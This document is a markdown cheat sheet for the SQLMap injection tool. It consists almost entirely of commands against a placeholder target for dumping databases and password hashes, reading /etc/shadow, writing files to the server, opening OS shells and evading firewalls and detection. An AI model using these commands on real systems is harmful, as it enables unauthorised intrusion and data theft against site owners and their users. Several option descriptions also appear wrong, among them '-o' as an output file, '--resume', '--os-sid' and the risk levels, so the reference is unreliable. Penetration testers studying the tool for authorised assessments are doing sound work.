# SQLMap - SQL Injection Tool

## Overview
SQLMap is an automated SQL injection and database takeover tool for:
- SQL injection detection and exploitation
- Database fingerprinting
- Data extraction from databases
- Database takeover (accessing underlying file system and executing OS commands)

## Basic Usage

### Simple SQL Injection Testing
```bash
# Test URL for SQL injection
sqlmap -u "http://target.com/page.php?id=1"

# Test POST request
sqlmap -u "http://target.com/login" --data="username=admin&password=pass"

# Test with cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="session=abc123"
```

### Request Methods
```bash
# GET request
sqlmap -u "http://target.com/page.php?id=1"

# POST request with data
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

# PUT request
sqlmap -u "http://target.com/api" --method=PUT --data="param=value"
```

## Target Specification

### Single Target
```bash
# Basic URL
sqlmap -u "http://target.com/page.php?id=1"

# URL with POST data
sqlmap -u "http://target.com/login" --data="username=admin"

# URL with headers
sqlmap -u "http://target.com/page.php?id=1" --headers="User-Agent: test"
```

### Multiple Targets
```bash
# URL from file
sqlmap -m urls.txt

# Bulk scanning from Burp/ZAP request
sqlmap -r request.txt

# Load Google dorks
sqlmap -g dork.txt
```

### Request Files
```bash
# Use Burp Suite request file
sqlmap -r request.txt

# Use custom request file
cat > request.txt << EOF
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=test
EOF

sqlmap -r request.txt
```

## Detection and Testing

### Basic Detection
```bash
# Automatic detection
sqlmap -u "http://target.com/page.php?id=1"

# Test all parameters
sqlmap -u "http://target.com/page.php?id=1&name=test" --level=3

# Risk level testing
sqlmap -u "http://target.com/page.php?id=1" --risk=3
```

### Testing Levels
```bash
# Level 1: Default (GET and POST parameters)
sqlmap -u "http://target.com/page.php?id=1" --level=1

# Level 2: Adds HTTP Cookie headers
sqlmap -u "http://target.com/page.php?id=1" --level=2

# Level 3: Adds HTTP User-Agent/Referer headers
sqlmap -u "http://target.com/page.php?id=1" --level=3

# Level 5: Adds HTTP Host header
sqlmap -u "http://target.com/page.php?id=1" --level=5
```

### Risk Levels
```bash
# Risk 1: Default (mostly harmless requests)
sqlmap -u "http://target.com/page.php?id=1" --risk=1

# Risk 2: Adds OR-based SQL injection tests
sqlmap -u "http://target.com/page.php?id=1" --risk=2

# Risk 3: Adds AND-based SQL injection tests
sqlmap -u "http://target.com/page.php?id=1" --risk=3
```

## Enumeration

### Basic Enumeration
```bash
# Get database banner
sqlmap -u "http://target.com/page.php?id=1" --banner

# Get current database
sqlmap -u "http://target.com/page.php?id=1" --current-db

# Get current user
sqlmap -u "http://target.com/page.php?id=1" --current-user

# Check if user is DBA
sqlmap -u "http://target.com/page.php?id=1" --is-dba
```

### Database Enumeration
```bash
# List all databases
sqlmap -u "http://target.com/page.php?id=1" --dbs

# List tables in database
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# List columns in table
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns

# Dump table content
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --dump
```

### User Enumeration
```bash
# List database users
sqlmap -u "http://target.com/page.php?id=1" --users

# List user privileges
sqlmap -u "http://target.com/page.php?id=1" --privileges

# List user passwords
sqlmap -u "http://target.com/page.php?id=1" --passwords
```

## Data Extraction

### Data Dumping
```bash
# Dump entire database
sqlmap -u "http://target.com/page.php?id=1" --dump-all

# Dump specific table
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --dump

# Dump specific columns
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name -C col1,col2 --dump

# Dump with search criteria
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --dump --where="id > 100"
```

### File Operations
```bash
# Read file from server
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"

# Write file to server
sqlmap -u "http://target.com/page.php?id=1" --file-write="local.txt" --file-dest="/tmp/remote.txt"

# Upload file to server
sqlmap -u "http://target.com/page.php?id=1" --file-upload="/tmp/upload.txt"
```

## Advanced Techniques

### Custom Injection
```bash
# Specify injection parameter
sqlmap -u "http://target.com/page.php?id=1&name=test" -p "id"

# Custom injection technique
sqlmap -u "http://target.com/page.php?id=1" --technique=B

# Test specific techniques (B: Boolean, E: Error, U: Union, S: Stacked)
sqlmap -u "http://target.com/page.php?id=1" --technique=BEU

# Skip certain techniques
sqlmap -u "http://target.com/page.php?id=1" --technique=BEU --skip=U
```

### Bypass Techniques
```bash
# Random User-Agent
sqlmap -u "http://target.com/page.php?id=1" --random-agent

# Tamper scripts for WAF bypass
sqlmap -u "http://target.com/page.php?id=1" --tamper="space2comment,randomcase"

# Custom tamper script
sqlmap -u "http://target.com/page.php?id=1" --tamper="/path/to/custom.py"

# Proxy support
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"
```

### OS Shell
```bash
# Get OS shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# SQL shell
sqlmap -u "http://target.com/page.php?id=1" --sql-shell

# Custom database shell
sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql --sql-shell
```

## Database-Specific Options

### MySQL
```bash
# Specify MySQL database
sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql

# MySQL with specific version
sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql --dbms-version=5.7

# MySQL with custom credentials
sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql --dbms-cred=root:password
```

### PostgreSQL
```bash
# PostgreSQL database
sqlmap -u "http://target.com/page.php?id=1" --dbms=postgresql

# PostgreSQL with specific version
sqlmap -u "http://target.com/page.php?id=1" --dbms=postgresql --dbms-version=12
```

### Oracle
```bash
# Oracle database
sqlmap -u "http://target.com/page.php?id=1" --dbms=oracle

# Oracle with SID
sqlmap -u "http://target.com/page.php?id=1" --dbms=oracle --os-sid=ORCL
```

## Output and Session Management

### Output Options
```bash
# Save output to file
sqlmap -u "http://target.com/page.php?id=1" -o output.txt

# Verbose output
sqlmap -u "http://target.com/page.php?id=1" -v 3

# Quiet mode
sqlmap -u "http://target.com/page.php?id=1" -v 0

# Batch mode (no interaction)
sqlmap -u "http://target.com/page.php?id=1" --batch
```

### Session Management
```bash
# Create session
sqlmap -u "http://target.com/page.php?id=1" --session="session_name"

# Resume session
sqlmap -u "http://target.com/page.php?id=1" --resume

# Flush session
sqlmap -u "http://target.com/page.php?id=1" --flush-session
```

## Practical Examples

### Quick Vulnerability Assessment
```bash
# Quick test of single URL
sqlmap -u "http://target.com/page.php?id=1" --batch --random-agent
```

### Comprehensive Database Enumeration
```bash
# Full database assessment
sqlmap -u "http://target.com/page.php?id=1" --batch --random-agent --dbs --tables --dump-all
```

### WAF Bypass
```bash
# Bypass WAF with tamper scripts
sqlmap -u "http://target.com/page.php?id=1" --batch --tamper="space2comment,randomcase" --random-agent
```

### File Access
```bash
# Read sensitive files
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/shadow"
```

### Shell Access
```bash
# Get reverse shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell --batch
```

## Advanced Configuration

### Custom Headers
```bash
# Add custom headers
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Custom: value\nX-Auth: token"

# Cookie injection
sqlmap -u "http://target.com/page.php?id=1" --cookie="session=abc123; auth=xyz"
```

### Authentication
```bash
# HTTP Basic Auth
sqlmap -u "http://user:pass@target.com/page.php?id=1"

# Form-based authentication
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --auth-cred="admin:password"
```

## Tips
- Always use `--batch` for automated scanning
- Use `--random-agent` to avoid simple detection
- Start with lower risk levels before escalating
- Use tamper scripts for WAF bypassing
- Save sessions for long-running assessments
- Be cautious with `--os-shell` and file operations
- Use proxy for debugging and analysis
- Consider legal implications before exploitation
- Test on non-production environments first